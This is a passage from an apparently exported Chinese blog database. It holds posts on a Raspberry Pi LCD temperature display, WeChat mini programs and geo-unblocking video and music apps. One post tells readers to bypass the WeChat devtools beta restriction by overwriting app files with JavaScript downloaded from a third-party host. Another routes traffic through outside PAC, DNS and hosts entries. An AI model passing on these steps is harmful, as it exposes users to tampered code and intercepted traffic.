<span class=\"title\">pulseEnable</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">True</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># 1 microsecond pause - enable pulse must be &gt; 450ns </span></div><div class=\"line\">        self.GPIO.output(self.pin_e, <span class=\"keyword\">False</span>)</div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1</span>)               <span class=\"comment\"># commands need &gt; 37us to settle</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">message</span><span class=\"params\">(self, text)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send string to LCD. Newline wraps to second line\"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</div><div class=\"line\">            <span class=\"keyword\">if</span> char == <span class=\"string\">'\\n'</span>:</div><div class=\"line\">                self.write4bits(<span class=\"number\">0xC0</span>) <span class=\"comment\"># next line</span></div><div class=\"line\">            <span class=\"keyword\">else</span>:</div><div class=\"line\">                self.write4bits(ord(char),<span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</div><div class=\"line\">        tmp = get_tmp() </div><div class=\"line\">        <span class=\"keyword\">if</span> tmp:</div><div class=\"line\">            lcd = Adafruit_CharLCD()</div><div class=\"line\">            lcd.noBlink()</div><div class=\"line\">            lcd.clear()</div><div class=\"line\">            lcd.message(tmp)</div><div class=\"line\">        sleep(<span class=\"number\">5</span>)</div></pre></td></tr></table></figure></p>\n<h1 id=\"运行效果\"><a href=\"#运行效果\" class=\"headerlink\" title=\"运行效果\"></a>运行效果</h1><p><img src=\"/content/images/2016/08/WechatIMG302.jpeg\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/08/WechatIMG293.jpeg\" alt=\"\"></p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://gist.github.com/hugozhu/6166527\">https://gist.github.com/hugozhu/6166527</a><br><a href=\"https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\">https://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f</a><br><a href=\"https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\">https://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py</a><br><a href=\"http://blog.csdn.net/xukai871105/article/details/12684617\">http://blog.csdn.net/xukai871105/article/details/12684617</a><br><a href=\"https://www.oschina.net/question/1425530\\_140979\">https://www.oschina.net/question/1425530\\_140979</a><br><a href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>"},{"title":"微信小程序的一些感想","date":"2016-09-25T17:50:00.000Z","_content":"\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n<!-- more --> \n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","source":"_posts/微信小程序的一些感想.md","raw":"---\ntitle: 微信小程序的一些感想\ndate: 2016-09-25 18:50:00\ntags: Web\ncategories: Web\n---\n\n# 前言\n这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n<!-- more --> \n# 下载\n微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。\nMac版下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\n\nwindows下载地址：\nhttp://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n\n# 破解\n如果你不是内测用户，你需要破解，先下载以下文件。\n\n文件1：\n\nhttp://source.lattecake.com/files/2016/09/createstep.js\n\n文件2：\n\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n\n替换路径：\n\ncreatestep.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\n\nprojectStores.js -> /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n\n# 尝鲜\n\n![](/content/images/wechat/1.jpg)\n\n![](/content/images/wechat/2.jpg)\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n* app.js\n* app.wxss\n* app.json\n* app.wxml\n\n其中wxss文件类似于css，所有css语法均支持\njs是APP()\njson文件是层级设置，页面的形态\nwxml文件更像是xml和html的混合版\n\n![](/content/images/wechat/3.jpg)\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n\n# 优点\n* **HTML5是未来，腾讯帮助整个生态系统往前走了一大步。**\n* 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n* 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n* 开发简单，入门门槛低。\n\n# 缺点\n* 不支持引用js，比如jquery等众多优秀的js插件。\n* 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n* 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n* 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n# 总结\n我想用一句名言总结一下前端趋势及未来App趋势：\n> Any application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","slug":"微信小程序的一些感想","published":1,"updated":"2016-11-19T12:08:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301k001pcdon5enqatvd","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。<br><a id=\"more\"></a> </p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\" target=\"_blank\" rel=\"external\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。<br>","more":"</p>\n<h1 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h1><p>微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。<br>Mac版下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg</a></p>\n<p>windows下载地址：<br><a href=\"http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\">http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe</a></p>\n<h1 id=\"破解\"><a href=\"#破解\" class=\"headerlink\" title=\"破解\"></a>破解</h1><p>如果你不是内测用户，你需要破解，先下载以下文件。</p>\n<p>文件1：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/createstep.js\">http://source.lattecake.com/files/2016/09/createstep.js</a></p>\n<p>文件2：</p>\n<p><a href=\"http://source.lattecake.com/files/2016/09/projectStores.js\">http://source.lattecake.com/files/2016/09/projectStores.js</a></p>\n<p>替换路径：</p>\n<p>createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js</p>\n<p>projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js</p>\n<h1 id=\"尝鲜\"><a href=\"#尝鲜\" class=\"headerlink\" title=\"尝鲜\"></a>尝鲜</h1><p><img src=\"/content/images/wechat/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/wechat/2.jpg\" alt=\"\"><br>做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：</p>\n<ul>\n<li>app.js</li>\n<li>app.wxss</li>\n<li>app.json</li>\n<li>app.wxml</li>\n</ul>\n<p>其中wxss文件类似于css，所有css语法均支持<br>js是APP()<br>json文件是层级设置，页面的形态<br>wxml文件更像是xml和html的混合版</p>\n<p><img src=\"/content/images/wechat/3.jpg\" alt=\"\"></p>\n<p>IDE并不强大，但是是用HTML写的，有点类似于VS CODE。</p>\n<h1 id=\"优点\"><a href=\"#优点\" class=\"headerlink\" title=\"优点\"></a>优点</h1><ul>\n<li><strong>HTML5是未来，腾讯帮助整个生态系统往前走了一大步。</strong></li>\n<li>腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。</li>\n<li>有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。</li>\n<li>开发简单，入门门槛低。</li>\n</ul>\n<h1 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h1><ul>\n<li>不支持引用js，比如jquery等众多优秀的js插件。</li>\n<li>可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。</li>\n<li>随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。</li>\n<li>没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>我想用一句名言总结一下前端趋势及未来App趋势：</p>\n<blockquote>\n<p>Any application that can be written in JavaScript, will eventually be written in JavaScript.</p>\n</blockquote>\n<p>腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。</p>\n<p>不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。</p>"},{"title":"树莓派实时温度湿度监测进阶","date":"2016-08-26T14:19:14.000Z","_content":"\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","source":"_posts/树莓派实时温度湿度监测进阶.md","raw":"---\ntitle: 树莓派实时温度湿度监测进阶\npermalink: runtimelcd\ndate: 2016-08-26 15:19:14\ntags: 'Raspberry'\n---\n\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","slug":"runtimelcd","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301l001rcdonbasj5we4","content":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n","excerpt":"","more":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n"},{"title":"海外App生存指南","id":"12","updated":"2016-08-12T22:30:50.000Z","date":"2016-08-12T22:13:34.000Z","_content":"<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","source":"_posts/海外App生存指南.md","raw":"---\ntitle: 海外App生存指南\ntags: '其他'\npermalink: hai-wai-appsheng-cun-zhi-nan\nid: 12\nupdated: '2016-08-12 23:30:50'\ndate: 2016-08-12 23:13:34\n---\n<!-- more --> \n# DNS/PAC大法\n## 优酷土豆爱奇艺\n在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：\n```bash\nhttp://pac.uku.im/pac.pac\n```\n\nDNS:\n```bash\n158.69.209.100\n```\n更新：https://github.com/uku/Unblock-Youku/issues/618\n# 替换hosts大法\n## 网易云音乐\n```bash\n104.236.189.178 http://music.163.com \n198.47.104.134 http://m1.music.126.net \n198.47.104.134 http://m2.music.126.net \n198.47.104.134 http://m3.music.126.net \n198.47.104.134 http://m4.music.126.net\n198.47.104.134 http://m5.music.126.net \n198.47.104.134 http://m6.music.126.net \n198.47.104.134 http://m7.music.126.net \n198.47.104.134 http://m8.music.126.net \n198.47.104.134 http://m9.music.126.net \n198.47.104.134 http://m10.music.126.net\n```\n","slug":"hai-wai-appsheng-cun-zhi-nan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym301n001ucdonnpn7m1sn","content":"<a id=\"more\"></a> \n<h1 id=\"DNS-PAC大法\"><a href=\"#DNS-PAC大法\" class=\"headerlink\" title=\"DNS/PAC大法\"></a>DNS/PAC大法</h1><h2 id=\"优酷土豆爱奇艺\"><a href=\"#优酷土豆爱奇艺\" class=\"headerlink\" title=\"优酷土豆爱奇艺\"></a>优酷土豆爱奇艺</h2><p>在 iOS 的 Wi-Fi 设置当中，点进某个 Wi-Fi 的属性页面，拖到最下面设置「HTTP 代理」-「自动」为：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://pac.uku.im/pac.pac</div></pre></td></tr></table></figure></p>\n<p>DNS:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">158.69.209.100</div></pre></td></tr></table></figure></p>\n<p>更新：<a 